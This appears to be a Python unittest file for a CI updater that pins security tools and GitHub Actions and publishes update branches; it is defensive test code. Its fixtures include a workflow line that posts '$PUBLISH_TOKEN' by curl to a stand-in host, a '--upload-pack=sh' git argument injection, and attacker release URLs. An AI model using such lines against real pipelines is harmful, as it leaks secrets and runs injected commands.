                self.assertTrue(proposed_root.is_relative_to(runner_temp))
                proposed_lock = (
                    proposed_root / "ci/tooling/security-tools.lock.yml"
                ).read_text(encoding="utf-8")
                self.assertIn(
                    "commit_sha: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
                    proposed_lock,
                )
                self.assert_connector_lock_unchanged(root, source_lock)
                return subprocess.CompletedProcess(arguments, 0, "", "")

            with (
                patch.dict(os.environ, {"RUNNER_TEMP": str(runner_temp)}),
                patch.object(UPDATER.subprocess, "run", side_effect=successful_check),
            ):
                UPDATER.validate_proposed_tree(root, candidate)

            self.assertEqual(len(commands), 1)
            self.assertEqual(commands[0][0][-1], "check-ci-security-contract")
            self.assertEqual(list(runner_temp.iterdir()), [])
            self.assert_connector_lock_unchanged(root, source_lock)

    def test_scope_verification_rejects_the_unallowlisted_source_of_a_rename(
        self,
    ) -> None:
        result = subprocess.CompletedProcess(
            ["git"],
            0,
            b"D\0unapproved-source.txt\0A\0.github/workflows/lint.yml\0",
            b"",
        )
        with patch.object(UPDATER.subprocess, "run", return_value=result) as run:
            with self.assertRaisesRegex(UPDATER.UpdateError, "unapproved-source.txt"):
                UPDATER.verify_git_scope(ROOT, staged=True)
        arguments = run.call_args.args[0]
        self.assertIn("--name-status", arguments)
        self.assertIn("-z", arguments)
        self.assertIn("--no-renames", arguments)

    def test_scope_verification_rejects_a_stale_reusable_branch(self) -> None:
        stale = subprocess.CompletedProcess(["git"], 1, b"", b"")
        with patch.object(UPDATER.subprocess, "run", return_value=stale) as run:
            with self.assertRaisesRegex(UPDATER.UpdateError, "stale"):
                UPDATER.verify_git_scope(
                    ROOT,
                    staged=False,
                    base="origin/main",
                    head="origin/automation/update-modsecurity-conector-workflow-tools",
                )
        arguments = run.call_args.args[0]
        self.assertIn("--end-of-options", arguments)
        self.assertFalse(run.call_args.kwargs["shell"])

        for unsafe_revision in (
            "--upload-pack=sh",
            "origin/../outside",
            "HEAD:README.md",
        ):
            with patch.object(UPDATER.subprocess, "run") as unsafe_run:
                with self.assertRaisesRegex(UPDATER.UpdateError, "safe Git revision"):
                    UPDATER.verify_git_scope(
                        ROOT,
                        staged=False,
                        base="origin/main",
                        head=unsafe_revision,
                    )
                with self.assertRaisesRegex(UPDATER.UpdateError, "safe Git revision"):
                    UPDATER.git_blob(ROOT, unsafe_revision, UPDATER.LOCK_RELATIVE_PATH)
                unsafe_run.assert_not_called()

    def test_existing_branch_cannot_change_a_tool_source_identity(self) -> None:
        _path, lock, _digest = UPDATER.load_lock(ROOT)
        base = deepcopy(lock)
        head = deepcopy(lock)
        changes = self.changed_tool(lock, "actionlint", "v9.9.9", "c" * 40, "d" * 64)
        changes["upstream_release"] = (
            "https://github.com/attacker/actionlint/releases/tag/v9.9.9"
        )
        changes["asset_url"] = (
            "https://github.com/attacker/actionlint/releases/download/"
            "v9.9.9/actionlint_9.9.9_linux_amd64.tar.gz"
        )
        self.replace_reviewed_record_fields(
            head["tools"]["actionlint"], changes, UPDATER.TOOL_CANDIDATE_SPEC
        )
        with self.assertRaisesRegex(UPDATER.UpdateError, "untrusted release URL"):
            UPDATER.verify_existing_branch_lock_records(base, head)

    def test_existing_branch_verifies_changed_tool_asset_against_base_identity(
        self,
    ) -> None:
        _path, lock, _digest = UPDATER.load_lock(ROOT)
        base = deepcopy(lock)
        head = deepcopy(lock)
        changes = self.changed_tool(
            base, "actionlint", "v9.9.9", "c" * 40, "d" * 64
        )
        self.replace_reviewed_record_fields(
            head["tools"]["actionlint"], changes, UPDATER.TOOL_CANDIDATE_SPEC
        )
        with (
            patch.object(
                UPDATER, "release_by_tag", return_value=self.tool_release_fixture(changes)
            ),
            patch.object(UPDATER, "release_tag_commit", return_value="c" * 40),
        ):
            UPDATER.verify_existing_branch_lock_records(base, head)

    def test_existing_branch_rejects_a_manually_modified_publisher_blob(self) -> None:
        lock_path = ROOT / "ci/tooling/security-tools.lock.yml"
        base_lock_blob = lock_path.read_bytes()
        base_lock = self.normalized_connector_lock(base_lock_blob)
        base_lock_digest = UPDATER.hashlib.sha256(base_lock_blob).hexdigest()
        head_lock = deepcopy(base_lock)
        blobs = self.generated_branch_blobs(ROOT, ROOT)
        updater_path = ".github/workflows/update-workflow-tools.yml"
        publisher_workflow = blobs[("head", updater_path)].decode("utf-8")
        blobs[("head", updater_path)] = publisher_workflow.replace(
            "          set -euo pipefail\n          UPDATE_BRANCH=",
            "          set -euo pipefail\n"
            '          curl --fail --silent --show-error --data "$PUBLISH_TOKEN" '
            "https://example.invalid/collect\n"
            "          UPDATE_BRANCH=",
            1,
        ).encode("utf-8")

        with tempfile.TemporaryDirectory() as temporary_directory:
            runner_temp = Path(temporary_directory) / "runner-temp"
            runner_temp.mkdir()
            with (
                patch.dict(os.environ, {"RUNNER_TEMP": str(runner_temp)}),
                patch.object(
                    UPDATER,
                    "git_blob",
                    side_effect=self.generated_branch_blob_reader(blobs),
                ),
            ):
                with self.assertRaisesRegex(
                    UPDATER.UpdateError,
                    "does not match constrained updater output",
                ):
                    UPDATER.verify_existing_branch_generated_blobs(
                        ROOT,
                        "base",
                        "head",
                        base_lock,
                        head_lock,
                        base_lock_digest,
                    )
            self.assertEqual(list(runner_temp.iterdir()), [])

    def test_existing_branch_accepts_exact_trusted_base_derived_blobs(self) -> None:
        base_lock_blob = (ROOT / "ci/tooling/security-tools.lock.yml").read_bytes()
        base_lock = self.normalized_connector_lock(base_lock_blob)
        checkout = self.changed_action(
            base_lock, "actions/checkout", "v9.9.9", "a" * 40
        )
        candidate = self.candidate_for(ROOT, {"actions/checkout": checkout})
        with tempfile.TemporaryDirectory() as temporary_directory:
            temporary_root = Path(temporary_directory)
            expected_root = self.copied_update_root(temporary_root / "expected")
            UPDATER.apply_candidate(expected_root, candidate)
            head_lock = self.normalized_connector_lock(
                (expected_root / "ci/tooling/security-tools.lock.yml").read_bytes()
            )
            blobs = self.generated_branch_blobs(ROOT, expected_root)

            runner_temp = temporary_root / "runner-temp"
            runner_temp.mkdir()
            with (
                patch.dict(os.environ, {"RUNNER_TEMP": str(runner_temp)}),
                patch.object(
                    UPDATER,
                    "git_blob",
                    side_effect=self.generated_branch_blob_reader(blobs),
                ),
            ):
                UPDATER.verify_existing_branch_generated_blobs(
                    ROOT,
                    "base",
                    "head",
                    base_lock,
                    head_lock,
                    UPDATER.hashlib.sha256(base_lock_blob).hexdigest(),
                )
            self.assertEqual(list(runner_temp.iterdir()), [])

    def test_publisher_workflow_keeps_resolver_validator_publisher_and_outcome_separate(
        self,
    ) -> None:
        workflow = (ROOT / ".github/workflows/update-workflow-tools.yml").read_text(
            encoding="utf-8"
        )
        required_workflow_markers = (
            "resolver:",
            "validator:",
            "publisher:",
            "outcome:",
            "actions/create-github-app-token@",
            "client-id: ${{ vars.WORKFLOW_UPDATER_APP_CLIENT_ID }}",
            "private-key: ${{ secrets.WORKFLOW_UPDATER_APP_PRIVATE_KEY }}",
            "permission-contents: write",
            "permission-pull-requests: write",
            "permission-workflows: write",
            "${{ steps.publisher_app_token.outputs.token }}",
            "Verify workflow publisher GitHub App configuration",
            "resolver_status",
            "candidate_sha256",
            "--expected-candidate-sha256",
            "--require-updates",
            "--verify-tool-assets",
            "--validate-proposed-tree",
            "modsecurity-conector-workflow-tool-publisher-validation",
            "verify-existing-branch --root .",
            'git switch --detach "origin/$DEFAULT_BRANCH"',
            'echo "reused=true" >> "$GITHUB_OUTPUT"',
            '"--force-with-lease=refs/heads/$UPDATE_BRANCH:$EXPECTED_REMOTE_TIP"',
            "draft: true",
            "verify-scope --root . --staged",
            "github.ref == format('refs/heads/{0}', github.event.repository.default_branch)",
            "if: ${{ always() }}",
            "permissions: {}",
            "No reviewed workflow or tool updates are currently available.",
        )
        for marker in required_workflow_markers:
            with self.subTest(marker=marker):
                self.assertIn(marker, workflow)
        _lock_path, lock, _digest = UPDATER.load_lock(ROOT)
        app_token = lock["actions"]["actions/create-github-app-token"]
        self.assertEqual(app_token["version"], "v3.2.0")
        self.assertEqual(
            app_token["immutable_commit"],
            "bcd2ba49218906704ab6c1aa796996da409d3eb1",
        )
        self.assertEqual(
            app_token["upstream"], "https://github.com/actions/create-github-app-token"
        )
        self.assertNotIn("${{ github.token }}", workflow)
        for forbidden_marker in ("|| true", "git push --force ", "pull_request_target"):
            with self.subTest(forbidden_marker=forbidden_marker):
                self.assertNotIn(forbidden_marker, workflow)
        self.assertNotRegex(workflow, r"git push\s+--force(?:\s|$)")


if __name__ == "__main__":
    unittest.main()
